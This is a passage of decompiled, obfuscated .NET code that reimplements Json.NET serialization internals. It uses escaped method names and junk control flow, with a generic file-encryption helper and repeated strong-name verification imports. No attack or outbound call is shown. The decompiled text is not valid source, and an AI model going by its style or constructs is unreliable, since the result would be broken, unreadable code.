            obj2.\u0001();
            str3 = global::\u0001.\u007E\u0001(obj2.\u0001());
            continue;
          }
          obj2.\u0001();
          str2 = global::\u0001.\u007E\u0001(obj2.\u0001());
          continue;
label_8:
          num = obj2.\u0001() ? 1 : 0;
          if (true)
            str1 = global::\u0001.\u007E\u0001(obj2.\u0001());
          else
            goto label_5;
        }
        else
        {
          obj2.\u0001();
          str4 = global::\u0001.\u007E\u0001(obj2.\u0001());
        }
      }
      IXmlNode xmlNode = obj0.\u0001(str4, str1, str2, str3);
      obj1.\u0001(xmlNode);
      return;
label_15:
      str4 = (string) null;
      goto label_1;
    }

    static void \u0001([In] \u0010.\u0011 obj0, [In] \u001B obj1, [In] object obj2) => \u0014.\u0006.\u0001(obj1, (\u0013.\u0007) new \u0008.\u0011(obj2, obj0));

    static JTokenType \u0001([In] object obj0, [In] JTokenType? obj1)
    {
      if (obj0 == null || obj0 == DBNull.Value)
        return JTokenType.Null;
      if (obj0 is string)
        return \u0014.\u0006.\u0001(obj1);
      if (obj0 is long || obj0 is int || obj0 is short || obj0 is sbyte || obj0 is ulong || obj0 is uint || obj0 is ushort || obj0 is byte)
        return JTokenType.Integer;
      while (!(obj0 is System.Enum))
      {
        if (!(obj0 is double))
        {
          if (true)
          {
            if (!(obj0 is float))
            {
              if (true)
              {
                if (!(obj0 is Decimal))
                {
                  if (obj0 is DateTime || obj0 is DateTimeOffset)
                    return JTokenType.Date;
                }
                else
                  goto label_11;
              }
              if (obj0 is byte[])
                return JTokenType.Bytes;
              if (obj0 is bool)
                return JTokenType.Boolean;
              if (obj0 is Guid)
              {
                int num = 15;
                return num == 0 ? (JTokenType) num : (JTokenType) num;
              }
              if (obj0 is Uri)
                return JTokenType.Uri;
              if (obj0 is TimeSpan)
                return JTokenType.TimeSpan;
              throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16859), (IFormatProvider) CultureInfo.InvariantCulture, (object) obj0.GetType()));
            }
          }
          else
            continue;
        }
label_11:
        return JTokenType.Float;
      }
      return JTokenType.Integer;
    }

    static int \u0001([In] \u0013.\u000F.\u0007 obj0) => \u0014.\u0006.\u0001(obj0) | \u0014.\u0006.\u0001(obj0) << 16;

    static void \u0001([In] \u0011.\u0008 obj0, [In] System.Type obj1)
    {
label_0:
      if (true)
        goto label_5;
label_2:
      if (true)
      {
        if (true)
        {
          if (true)
            return;
          goto label_6;
        }
        else
          goto label_0;
      }
      else
        goto label_6;
label_5:
      obj0.\u0001 = obj1;
label_6:
      // ISSUE: type reference
      obj0.\u0001 = (object) obj1 != null && \u0093\u0002.\u007E\u0012\u0006((object) \u0004\u0002.\u0084\u0004(__typeref (\u0015.\u0013)), obj1);
      goto label_2;
    }

    static JsonSerializationException \u0001(
      [In] \u000F.\u0001 obj0,
      [In] string obj1,
      [In] string obj2,
      [In] Exception obj3)
    {
      obj2 = \u0011.\u0002.\u0001(obj0, obj1, obj2);
      return new JsonSerializationException(obj2, obj3);
    }

    static bool \u0001([In] JsonSerializerInternalReader obj0, [In] \u0012.\u0007 obj1, [In] \u0016.\u0007 obj2, [In] bool obj3)
    {
      if (true)
        goto label_16;
label_2:
      obj1.\u0001();
      if (true)
        goto label_15;
label_5:
      obj1.\u0001();
label_15:
      return obj1.\u0001() != 0;
label_16:
      if (obj3)
        return obj1.\u0001();
      if (obj2 != null)
        goto label_19;
label_1:
      int num = 0;
      goto label_20;
label_19:
      num = (int) obj2.\u0001;
label_20:
      switch (num)
      {
        case 0:
          return \u0014.\u0006.\u0001(obj1);
        case 1:
          goto label_2;
        case 2:
          if (true)
          {
            obj1.\u0001();
            goto label_15;
          }
          else
            goto case 8;
        case 3:
          obj1.\u0002();
          goto label_15;
        case 4:
          if (true)
          {
            obj1.\u0001();
            goto label_15;
          }
          else
            goto label_15;
        case 5:
          obj1.\u0001();
          goto label_15;
        case 6:
          if (true)
          {
            if (true)
            {
              obj1.\u0001();
              goto label_15;
            }
            else
              goto label_2;
          }
          else
            goto label_1;
        case 7:
          goto label_5;
        case 8:
          obj1.\u0001();
          goto label_15;
        default:
          throw new ArgumentOutOfRangeException();
      }
    }

    static void \u0001([In] string obj0, [In] SymmetricAlgorithm obj1, [In] string obj2)
    {
      byte[] numArray1 = new byte[65536];
      byte[] numArray2;
      if (true)
        numArray2 = numArray1;
      FileStream fileStream1 = new FileStream(obj0, FileMode.Open);
      try
      {
        FileStream fileStream2 = new FileStream(obj2, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, \u0007\u0004.\u007E\u009A\u0007((object) obj1), CryptoStreamMode.Write);
          try
          {
            int num1;
            do
            {
              int num2 = \u0008\u0004.\u007E\u009C\u0007((object) fileStream1, numArray2, 0, numArray2.Length);
              num1 = num2;
              if (true)
              {
                if (num1 != 0)
                  \u000E\u0004.\u007E\u009D\u0007((object) cryptoStream, numArray2, 0, num2);
                num1 = num2;
              }
            }
            while (num1 != 0);
          }
          finally
          {
            if (cryptoStream != null)
              global::\u0011.\u007E\u0007\u0002((object) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            global::\u0011.\u007E\u0007\u0002((object) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          global::\u0011.\u007E\u0007\u0002((object) fileStream1);
      }
    }

    static void \u0001([In] FieldInfo obj0, [In] ILGenerator obj1, [In] \u0007.\u0001 obj2)
    {
label_0:
      if (\u0015\u0002.\u007E\u0014\u0005((object) obj0))
        goto label_3;
      else
        goto label_6;
label_1:
      if (true)
      {
        \u0098\u0002.\u007E\u001D\u0006((object) obj1, OpCodes.Ldfld, obj0);
        if (false)
          goto label_4;
        else
          goto label_4;
      }
      else
        goto label_0;
label_3:
      \u0098\u0002.\u007E\u001D\u0006((object) obj1, OpCodes.Ldsfld, obj0);
label_4:
      \u0003.\u0003.\u0002(obj1, \u0001\u0002.\u007E\u001F\u0004((object) obj0));
      if (true)
      {
        \u0003.\u0003.\u0001(obj1);
        return;
      }
      goto label_1;
label_6:
      \u0003.\u0003.\u0001(obj1, \u0001\u0002.\u007E\u0018\u0004((object) obj0));
      goto label_1;
    }

    static string \u0001([In] \u0015.\u0012 obj0, [In] \u0015.\u0013 obj1) => ((\u0002.\u0004) obj1).\u0001();

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonSerializerInternalReader obj1, [In] object obj2, [In] string obj3)
    {
      try
      {
        if (obj1.\u0001 != null && obj1.\u0001.\u0001() >= TraceLevel.Verbose)
          goto label_2;
label_1:
        \u0014.\u0006.\u0001(obj1.\u0001).\u0001((object) obj1, obj3, obj2);
        return;
label_2:
        obj1.\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001(obj0 as \u000F.\u0001, obj0.\u0001(), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16928), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3, (object) \u0001\u0002.\u007E\u0017\u0004(obj2))), (Exception) null);
        goto label_1;
      }
      catch (Exception ex)
      {
        throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(16981), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj3), ex, obj0);
      }
    }

    static bool? \u0001([In] \u0015.\u0013 obj0)
    {
      bool? nullable;
      if (obj0 == null)
        nullable = new bool?();
      else
        goto label_13;
label_12:
      return nullable;
label_13:
      \u0006.\u0005 obj1 = \u0014.\u0006.\u0001(obj0);
      if (obj1 != null)
      {
        int num1 = 1;
        int num2;
        while (true)
        {
          JTokenType[] jtokenTypeArray = \u0015.\u0013.\u0001;
          \u0006.\u0005 obj2 = obj1;
          if (\u0014.\u0006.\u0001(num1 != 0, jtokenTypeArray, (\u0015.\u0013) obj2))
          {
            if (true)
            {
              if (obj1.\u0001 != null)
              {
                num2 = Convert.ToBoolean(obj1.\u0001, (IFormatProvider) CultureInfo.InvariantCulture) ? 1 : 0;
                if (false)
                  num1 = num2;
                else
                  goto label_11;
              }
              else
                break;
            }
            else
              goto label_12;
          }
          else
            goto label_5;
        }
        if (true)
          return new bool?();
        goto label_12;
label_11:
        return new bool?(num2 != 0);
      }
label_5:
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17034), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static void \u0001([In] \u0010.\u0006 obj0, [In] JsonWriter obj1, [In] object obj2, [In] System.Type obj3)
    {
      if (obj1 == null)
        throw new ArgumentNullException(\u0014.\u0006.\u0082(4314));
      obj0.\u0001 = obj3;
      do
      {
        obj0.\u0001 = obj0.\u0001.Count + 1;
      }
      while (false);
      \u0016.\u0007 obj = \u0014.\u0006.\u0001(obj2, obj0);
      try
      {
        if (\u0014.\u0006.\u0001(obj2, obj, (JsonProperty) null, (JsonProperty) null, (\u0006.\u0002) null, obj0))
          \u0014.\u0006.\u0001(obj2, obj1, obj0);
        else
          \u0014.\u0006.\u0001(obj0, obj1, obj2, obj, (JsonProperty) null, (\u0006.\u0002) null, (JsonProperty) null);
      }
      catch (Exception ex)
      {
        if (\u0014.\u0006.\u0001(\u0014.\u0006.\u0001(obj1), (object) null, (object) null, ex, (\u000F.\u0001) null, obj, (\u0016.\u0008) obj0))
        {
          \u0014.\u0006.\u0001(obj1, obj0, 0);
        }
        else
        {
          \u0014.\u0006.\u0001((\u0016.\u0008) obj0);
          if (false)
            return;
          throw;
        }
      }
      finally
      {
        obj0.\u0001 = (System.Type) null;
      }
    }

    static System.Type \u0001([In] object obj0) => obj0 == null ? (System.Type) null : \u0001\u0002.\u007E\u0017\u0004(obj0);

    static void \u0001([In] object obj0, [In] object obj1, [In] \u0015.\u0007 obj2, [In] string obj3) => obj2.\u0001()[obj3].\u0001()(obj0, obj1);

    static long \u0001([In] TimeSpan obj0, [In] DateTime obj1) => (\u0014.\u0006.\u0001(obj1, obj0) - \u0004.\u0007.\u0001) / 10000L;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static JsonProperty \u0001([In] \u0006.\u0004 obj0, [In] string obj1)
    {
      JsonProperty jsonProperty;
      while (true)
      {
        jsonProperty = \u0014.\u0006.\u0001(obj1, StringComparison.Ordinal, obj0);
        if (true)
        {
          if (jsonProperty == null)
          {
            jsonProperty = \u0014.\u0006.\u0001(obj1, StringComparison.OrdinalIgnoreCase, obj0);
            break;
          }
          break;
        }
      }
      return jsonProperty;
    }

    static void \u0001([In] object obj0, [In] JsonWriter obj1, [In] \u0010.\u0006 obj2)
    {
      string str = \u0014.\u0006.\u0001(obj0, obj1, obj2);
      if (false)
        return;
      if (((\u0016.\u0008) obj2).\u0001 == null)
        goto label_4;
label_1:
      if (true)
      {
        if (true)
        {
          if (((\u0016.\u0008) obj2).\u0001.\u0001() >= TraceLevel.Info)
            ((\u0016.\u0008) obj2).\u0001.\u0001(TraceLevel.Info, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17079), (IFormatProvider) \u0098.\u0002\u0004(), (object) str, (object) \u0001\u0002.\u007E\u0017\u0004(obj0))), (Exception) null);
        }
        else
          goto label_7;
      }
label_4:
      do
      {
        obj1.\u0002();
        if (false)
          goto label_1;
      }
      while (false);
      obj1.\u0001(\u0014.\u0006.\u0082(9520), false);
      obj1.\u0004(str);
label_7:
      obj1.\u0011();
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static JsonContainerType \u0001([In] JsonWriter obj0)
    {
      \u0011.\u0002 obj = obj0.\u0001;
      if (obj0.\u0001 == null || obj0.\u0001.Count <= 0)
        obj0.\u0001 = new \u0011.\u0002();
      else
        goto label_3;
label_2:
      return obj.\u0001;
label_3:
      obj0.\u0001 = obj0.\u0001[obj0.\u0001.Count - 1];
      obj0.\u0001.RemoveAt(obj0.\u0001.Count - 1);
      goto label_2;
    }

    static string \u0001([In] object obj0)
    {
      if (obj0 == null)
      {
        if (true)
          return \u0014.\u0006.\u0082(17140);
      }
      else if (!(obj0 is string))
        return global::\u0001.\u007E\u0001(obj0);
      return global::\u0005.\u0099(\u0014.\u0006.\u0082(17149), global::\u0001.\u007E\u0001(obj0), \u0014.\u0006.\u0082(17149));
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0013.\u000F.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0013.\u000F.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0013.\u000F.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0013.\u000F.\u0006.\u0001[obj0 >> 12]);

    static string \u0001([In] System.Type obj0)
    {
      while (\u0015.\u000E.\u0004(obj0) || !\u0015.\u000E.\u0001(obj0))
      {
        if (true)
          return global::\u0001.\u007E\u0008((object) obj0);
      }
      return global::\u0002.\u0095((IFormatProvider) \u0098.\u0002\u0004(), \u0014.\u0006.\u0082(8661), new object[2]
      {
        (object) global::\u0001.\u007E\u0014((object) obj0),
        (object) global::\u0001.\u007E\u000E((object) obj0)
      });
    }

    static \u0015.\u000F \u0001([In] DefaultContractResolver obj0) => obj0.\u0001 ? DefaultContractResolver.\u0001 : obj0.\u0002;

    static bool \u0001([In] \u0015.\u0013 obj0, [In] \u0015.\u0013 obj1)
    {
      if (true)
        goto label_9;
label_8:
      return false;
label_9:
      \u0006.\u0005 obj = obj0 as \u0006.\u0005;
      if (true)
        goto label_10;
label_4:
      int num1 = \u0006\u0002.\u007E\u0089\u0004((object) obj, (object) obj1) ? 1 : 0;
label_6:
      return false ? num1 != 0 : num1 != 0;
label_10:
      if (obj != null)
      {
        if (((\u0015.\u0013) obj).\u0001() == JTokenType.Null && obj1 == null)
        {
          int num2 = 1;
          if (num2 != 0)
            return num2 != 0;
          num1 = num2;
          goto label_6;
        }
        else
          goto label_4;
      }
      else
        goto label_8;
    }

    static bool \u0001([In] \u0010.\u0006 obj0, [In] \u0006.\u0001 obj1, [In] \u0006.\u0001 obj2) => (obj1 & obj2) == obj2;

    static System.Type \u0001([In] \u0015.\u0005 obj0) => obj0.\u0001;

    static \u0016.\u0003 \u0001()
    {
      Func<\u0016.\u0001> func = \u0015.\u0006.\u0001();
      return \u0014.\u0006.\u0001(func != null ? func() : (\u0016.\u0001) null);
    }

    static Func<object[], \u0005.\u0005> \u0001([In] System.Type obj0)
    {
      // ISSUE: variable of a compiler-generated type
      JsonTypeReflector.\u0001 obj;
      do
      {
        // ISSUE: object of a compiler-generated type is created
        obj = new JsonTypeReflector.\u0001();
        // ISSUE: reference to a compiler-generated field
        obj.\u0001 = obj0;
      }
      while (false);
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      obj.\u0001 = \u0014.\u0006.\u0001(obj.\u0001, false) ? \u0014.\u0006.\u0001().\u0001<object>(obj.\u0001) : (Func<object>) null;
      // ISSUE: reference to a compiler-generated method
      return new Func<object[], \u0005.\u0005>(obj.\u0001);
    }

    static unsafe int \u0001([In] \u0011.\u0003 obj0, [In] bool obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      if (obj0.\u0001)
        return 0;
      if (obj0.\u0001 + obj2 >= obj0.\u0001.Length - 1)
        goto label_15;
label_10:
      *(int*) voidPtr = obj0.\u0001.Length - obj0.\u0001 - 1;
      *(int*) ((IntPtr) voidPtr + 4) = \u000F\u0004.\u007E\u009F\u0007((object) obj0.\u0001, obj0.\u0001, obj0.\u0001, *(int*) voidPtr);
      obj0.\u0001 += *(int*) ((IntPtr) voidPtr + 4);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        obj0.\u0001 = true;
      obj0.\u0001[obj0.\u0001] = char.MinValue;
label_13:
      return *(int*) ((IntPtr) voidPtr + 4);
label_15:
      if (!obj1)
      {
        *(int*) ((IntPtr) voidPtr + 12) = obj0.\u0001 - obj0.\u0002;
        if (*(int*) ((IntPtr) voidPtr + 12) + obj2 + 1 >= obj0.\u0001.Length)
        {
          char[] chArray1 = \u0014.\u0006.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 12) + obj2 + 1);
          if (*(int*) ((IntPtr) voidPtr + 12) > 0)
          {
            char[] chArray2 = obj0.\u0001;
            *(int*) ((IntPtr) voidPtr + 16) = obj0.\u0002;
            \u0014.\u0006.\u0001(0, *(int*) ((IntPtr) voidPtr + 16), *(int*) ((IntPtr) voidPtr + 12), chArray1, chArray2);
          }
          \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0001);
          obj0.\u0001 = chArray1;
        }
        else if (*(int*) ((IntPtr) voidPtr + 12) > 0)
        {
          char[] chArray3 = obj0.\u0001;
          *(int*) ((IntPtr) voidPtr + 16) = obj0.\u0002;
          char[] chArray4 = obj0.\u0001;
          \u0014.\u0006.\u0001(0, *(int*) ((IntPtr) voidPtr + 16), *(int*) ((IntPtr) voidPtr + 12), chArray4, chArray3);
        }
        obj0.\u0003 -= obj0.\u0002;
        obj0.\u0002 = 0;
        obj0.\u0001 = *(int*) ((IntPtr) voidPtr + 12);
        goto label_10;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 8) = \u009D.\u0014\u0004(obj0.\u0001.Length * 2, obj0.\u0001 + obj2 + 1);
        char[] chArray5 = \u0014.\u0006.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
        char[] chArray6 = obj0.\u0001;
        *(int*) ((IntPtr) voidPtr + 20) = obj0.\u0001.Length;
        if (true)
        {
          \u0014.\u0006.\u0001(0, 0, *(int*) ((IntPtr) voidPtr + 20), chArray5, chArray6);
          \u0014.\u0006.\u0001(obj0.\u0001, obj0.\u0001);
          obj0.\u0001 = chArray5;
          goto label_10;
        }
        else
          goto label_13;
      }
    }

    static \u0005.\u0005 \u0001([In] \u0016.\u0003 obj0, [In] System.Type obj1) => \u0014.\u0006.\u0001((IList<\u0005.\u0005>) obj0.\u0001, obj1);

    static void \u0001([In] PropertyInfo obj0, [In] ILGenerator obj1, [In] \u0007.\u0001 obj2)
    {
      MethodInfo methodInfo = \u0010\u0004.\u007E\u0001\u0008((object) obj0, true);
      if ((object) methodInfo == null)
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17154), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) obj0)));
      if (!\u0015\u0002.\u007E\u0097\u0004((object) methodInfo))
        \u0003.\u0003.\u0001(obj1, \u0001\u0002.\u007E\u0018\u0004((object) obj0));
      \u0003.\u0003.\u0001(obj1, methodInfo);
      \u0003.\u0003.\u0002(obj1, \u0001\u0002.\u007E\u001D\u0004((object) obj0));
      \u0003.\u0003.\u0001(obj1);
    }

    static bool \u0001([In] MemberInfo obj0, [In] BindingFlags obj1)
    {
      if (\u0015.\u000E.\u0001(obj0) != MemberTypes.Property)
        return false;
      if (true)
        goto label_23;
label_8:
      System.Type type1;
      PropertyInfo propertyInfo1;
      MemberInfo[] memberInfoArray;
      int num1;
      int num2;
      do
      {
        num1 = \u0015.\u000E.\u0003(type1) ? 1 : 0;
        if (true)
        {
          if (num1 == 0)
            return false;
          System.Type type2 = \u0001\u0002.\u007E\u001E\u0004((object) type1);
          if ((object) type2 == null)
            num2 = 0;
          else
            goto label_15;
label_13:
          if (num2 == 0)
            return num2 != 0;
          goto label_7;
label_15:
          memberInfoArray = \u0011\u0004.\u007E\u0003\u0008((object) type2, global::\u0001.\u007E\u000E((object) propertyInfo1), obj1);
          if (memberInfoArray.Length == 0)
          {
            num2 = 0;
            if (num2 == 0)
              return num2 != 0;
            goto label_13;
          }
        }
        else
          goto label_21;
      }
      while (false);
      goto label_19;
label_21:
      return num1 != 0;
label_7:
      return num2 != 0;
label_19:
      if (\u0015\u0002.\u007E\u0018\u0005((object) \u0014.\u0006.\u0001(memberInfoArray[0])))
        return true;
      int num3 = 0;
      return num3 != 0 ? num3 != 0 : num3 != 0;
label_23:
      PropertyInfo propertyInfo2 = (PropertyInfo) obj0;
      if (true)
        propertyInfo1 = propertyInfo2;
      if (!ReflectionUtils.\u0001(propertyInfo1))
        return false;
      type1 = \u0001\u0002.\u007E\u0018\u0004((object) propertyInfo1);
      goto label_8;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0016.\u0003 obj0, [In] \u0012.\u0013 obj1)
    {
      EventHandler<\u0012.\u0013> eventHandler = obj0.\u0001;
      if (eventHandler == null)
        return;
      eventHandler((object) obj0, obj1);
    }

    static Decimal? \u0001([In] \u0015.\u0013 obj0)
    {
      if (obj0 == null)
        return new Decimal?();
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj != null)
      {
        int num = 1;
        if (num != 0)
          num = \u0014.\u0006.\u0001(num != 0, \u0015.\u0013.\u0002, (\u0015.\u0013) obj) ? 1 : 0;
        if (num != 0)
          return obj.\u0001 == null ? new Decimal?() : new Decimal?(Convert.ToDecimal(obj.\u0001, (IFormatProvider) CultureInfo.InvariantCulture));
      }
      throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17207), (IFormatProvider) CultureInfo.InvariantCulture, (object) \u0014.\u0006.\u0001(obj0)));
    }

    static JsonContainerType \u0001([In] \u0012.\u0007 obj0, [In] JsonToken obj1)
    {
      int num1 = (int) (obj1 - 13);
      if (false)
        return (JsonContainerType) num1;
      int num2;
      switch (num1)
      {
        case 0:
          num2 = 1;
          break;
        case 1:
          int num3 = 2;
          if (num3 == 0)
          {
            num2 = num3;
            break;
          }
          return num3 == 0 ? (JsonContainerType) num3 : (JsonContainerType) num3;
        case 2:
          return JsonContainerType.Constructor;
        default:
          if (true)
            throw \u0014.\u0006.\u0001(obj0, \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17252), (IFormatProvider) \u0098.\u0002\u0004(), (object) obj1));
          goto case 0;
      }
      return num2 == 0 ? (JsonContainerType) num2 : (JsonContainerType) num2;
    }

    static void \u0001([In] \u000E.\u000E obj0, [In] \u0015.\u0013 obj1)
    {
      switch (obj1.\u0001())
      {
        case JTokenType.Object:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartObject);
          break;
        case JTokenType.Array:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartArray);
          break;
        case JTokenType.Constructor:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.StartConstructor, (object) ((\u0002.\u0003) obj1).\u0001);
          break;
        case JTokenType.Property:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.PropertyName, (object) ((\u0002.\u0004) obj1).\u0001());
          break;
        case JTokenType.Comment:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Comment, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Integer:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Integer, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Float:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Float, ((\u0006.\u0005) obj1).\u0001);
          if (true)
            break;
          goto case JTokenType.Integer;
        case JTokenType.String:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, ((\u0006.\u0005) obj1).\u0001);
          if (false)
            break;
          break;
        case JTokenType.Boolean:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Boolean, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Null:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Null, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Undefined:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Undefined, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Date:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Date, ((\u0006.\u0005) obj1).\u0001);
          break;
        case JTokenType.Raw:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Raw, ((\u0006.\u0005) obj1).\u0001);
          if (true)
            break;
          goto case JTokenType.Array;
        case JTokenType.Bytes:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.Bytes, ((\u0006.\u0005) obj1).\u0001);
          if (false)
            break;
          break;
        case JTokenType.Guid:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) \u0014.\u0006.\u0001(obj0, ((\u0006.\u0005) obj1).\u0001));
          break;
        case JTokenType.Uri:
          object obj = ((\u0006.\u0005) obj1).\u0001;
          if ((object) (obj as Uri) != null)
          {
            \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) global::\u0001.\u007E\u0007((object) (Uri) obj));
            break;
          }
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) \u0014.\u0006.\u0001(obj0, obj));
          break;
        case JTokenType.TimeSpan:
          \u0014.\u0006.\u0001((\u0012.\u0007) obj0, JsonToken.String, (object) \u0014.\u0006.\u0001(obj0, ((\u0006.\u0005) obj1).\u0001));
          break;
        default:
          throw \u0014.\u0006.\u0001(\u0014.\u0006.\u0082(3429), (object) obj1.\u0001(), \u0014.\u0006.\u0082(17297));
      }
    }

    static DateTime \u0001([In] DateTime obj0)
    {
      if (true)
      {
        DateTimeKind kind = obj0.Kind;
        while (true)
        {
          switch (kind)
          {
            case DateTimeKind.Unspecified:
              if (true)
                return new DateTime(obj0.Ticks, DateTimeKind.Local);
              break;
            case DateTimeKind.Utc:
              return obj0.ToLocalTime();
            case DateTimeKind.Local:
              return obj0;
          }
          if (true)
            break;
        }
      }
      return obj0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static object \u0001([In] MemberInfo obj0, [In] object obj1)
    {
      if (true)
        goto label_8;
label_1:
      MemberTypes memberTypes;
      if (true)
      {
        if (memberTypes == MemberTypes.Field)
          return \u0087\u0002.\u007E\u009C\u0005((object) (FieldInfo) obj0, obj1);
        if (memberTypes != MemberTypes.Property)
          throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17392), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) obj0)), \u0014.\u0006.\u0082(8901));
        try
        {
          return \u0012\u0004.\u007E\u0004\u0008((object) (PropertyInfo) obj0, obj1, (object[]) null);
        }
        catch (TargetParameterCountException ex)
        {
          throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17339), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) obj0)), (Exception) ex);
        }
      }
      else
        goto label_10;
label_8:
      MemberInfo memberInfo = obj0;
      string str = \u0014.\u0006.\u0082(8901);
      if (true)
        \u0014.\u0006.\u0001((object) memberInfo, str);
label_10:
      \u0014.\u0006.\u0001(obj1, \u0014.\u0006.\u0082(17330));
      memberTypes = \u0015.\u000E.\u0001(obj0);
      goto label_1;
    }

    static string \u0001([In] \u000F.\u0005 obj0) => global::\u0001.\u007E\u0001((object) obj0.\u0001);

    static bool \u0001(string _param0, out Guid _param1)
    {
      if (true)
      {
        switch (_param0)
        {
          case null:
            throw new ArgumentNullException(\u0014.\u0006.\u0082(17469));
          default:
            int num = \u0015\u0002.\u007E\u0019\u0005((object) \u0013\u0004.\u007E\u0006\u0008((object) new Regex(\u0014.\u0006.\u0082(17474)), _param0)) ? 1 : 0;
            if (false)
              return num != 0;
            if (false)
              return num != 0;
            if (num == 0)
            {
              _param1 = Guid.Empty;
              return false;
            }
            break;
        }
      }
      _param1 = new Guid(_param0);
      return true;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0012.\u0007 obj0, [In] JsonToken obj1, [In] object obj2, [In] bool obj3)
    {
      obj0.\u0001 = obj1;
      obj0.\u0001 = obj2;
      switch (obj1)
      {
        case JsonToken.StartObject:
          obj0.\u0001 = \u0012.\u0007.\u0001.\u0004;
          \u0014.\u0006.\u0001(JsonContainerType.Object, obj0);
          return;
        case JsonToken.StartArray:
          obj0.\u0001 = \u0012.\u0007.\u0001.\u0006;
          break;
        case JsonToken.StartConstructor:
